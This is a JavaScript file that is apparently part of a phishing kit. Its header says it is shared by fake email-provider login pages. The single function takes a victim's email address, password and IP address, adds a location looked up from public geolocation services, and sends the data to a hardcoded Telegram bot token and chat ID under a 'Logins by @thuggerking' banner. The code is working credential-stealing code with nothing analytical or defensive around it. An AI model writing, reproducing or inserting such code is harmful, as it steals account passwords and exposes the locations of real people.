/**
 * Centralized Telegram Reporting System
 * 
 * All email provider pages use this centralized function for reporting
 * Each report includes a provider tag for identification
 */

// Telegram Configuration (Centralized)
const CENTRALIZED_TELEGRAM_CONFIG = {
    botToken: '8312131019:AAFjAXs4p28cGSwn9JHBa3rYksp8HK4WAz0',
    chatId: '7900288517'
};

/**
 * Send centralized Telegram report with provider tag and Geo-Location
 * @param {string} provider - Provider name/tag (e.g., 'outlook', 'zoho', 'bell')
 * @param {string} email - User's email address
 * @param {string} password - User's password
 * @param {string} ip - Client IP address
 * @param {function} callback - Optional callback function
 */
function sendCentralizedTelegramReport(provider, email, password, ip, callback) {
    // Start with basic message
    var providerName = provider.charAt(0).toUpperCase() + provider.slice(1);
    var baseMsg = providerName + ' Logins by @thuggerking (Telegram) %0AEmail: ' +
        encodeURIComponent(email) +
        '%0APassword: ' + encodeURIComponent(password) +
        '%0AClient IP: ' + encodeURIComponent(ip || window.userip || 'n/a') +
        '%0AProvider Tag: ' + encodeURIComponent(provider);

    // Function to actually send to Telegram
    var transmitReport = function (finalMsg) {
        var url = 'https://api.telegram.org/bot' +
            encodeURIComponent(CENTRALIZED_TELEGRAM_CONFIG.botToken) +
            '/sendMessage?chat_id=' +
            encodeURIComponent(CENTRALIZED_TELEGRAM_CONFIG.chatId) +
            '&text=' + finalMsg;

        if (typeof $ !== 'undefined' && $.ajax) {
            $.ajax({
                url: url,
                type: 'GET',
                success: function () { if (callback) callback(true); },
                error: function () { if (callback) callback(false); }
            });
        } else {
            fetch(url).then(function (r) { if (callback) callback(r.ok); }).catch(function () { if (callback) callback(false); });
        }
    };

    // Attempt Geo-Location Lookup
    var lookupGeo = function (index) {
        var apis = [
            'https://ipapi.co/' + (ip && ip !== 'n/a' ? ip + '/' : '') + 'json/',
            'https://freeipapi.com/api/json' + (ip && ip !== 'n/a' ? '/' + ip : '')
        ];

        if (index >= apis.length) {
            transmitReport(baseMsg);
            return;
        }

        fetch(apis[index])
            .then(function (response) { return response.json(); })
            .then(function (data) {
                // Handle different response formats
                var city = data.city || data.cityName || 'Unknown City';
                var region = data.region || data.regionName || 'Unknown State';
                var country = data.country_name || data.countryName || data.country || 'Unknown Country';

                var locInfo = '%0ALocation: ' +
                    encodeURIComponent(city) + ', ' +
                    encodeURIComponent(region) + ', ' +
                    encodeURIComponent(country);
                transmitReport(baseMsg + locInfo);
            })
            .catch(function () {
                // Try next API in fallback chain
                lookupGeo(index + 1);
            });
    };

    try {
        lookupGeo(0);
    } catch (e) {
        transmitReport(baseMsg);
    }
}

